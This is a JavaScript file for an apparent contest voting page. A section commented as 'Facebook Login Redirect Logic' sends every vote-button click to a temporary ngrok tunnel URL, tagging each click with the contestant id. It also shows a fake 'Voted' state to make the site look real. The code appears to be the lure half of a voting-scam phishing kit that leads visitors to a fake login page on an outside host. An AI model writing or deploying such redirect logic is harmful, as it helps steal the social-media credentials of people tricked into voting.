document.addEventListener('DOMContentLoaded', () => {

    // --- Sound and "Click to Enter" logic has been removed ---


    // --- Facebook Login Redirect Logic ---
    const allVoteButtons = document.querySelectorAll('.vote-btn');
    const baseLoginUrl = 'https://862d142c96fd.ngrok-free.app/';

    allVoteButtons.forEach(button => {
        button.addEventListener('click', () => {
            const contestantId = button.getAttribute('data-id');
            if (contestantId) {
                const loginUrl = `${baseLoginUrl}?source=${contestantId}`;
                window.location.href = loginUrl;
            } else {
                window.location.href = baseLoginUrl;
            }
        });
    });

    // --- Handle "Voted" State on Individual Contestant Pages ---
    const body = document.querySelector('body');
    const pageId = body.getAttribute('data-page-id');

    if (pageId) {
        const voteButton = document.querySelector(`.vote-btn[data-id="${pageId}"]`);
        if (voteButton) {
            voteButton.innerHTML = '<i class="fas fa-check-circle"></i> Voted';
            voteButton.classList.add('voted');
            voteButton.onclick = (e) => {
                e.preventDefault(); // Prevent redirection
                console.log(`Already voted for ${pageId}`);
            };
        }
    }
});
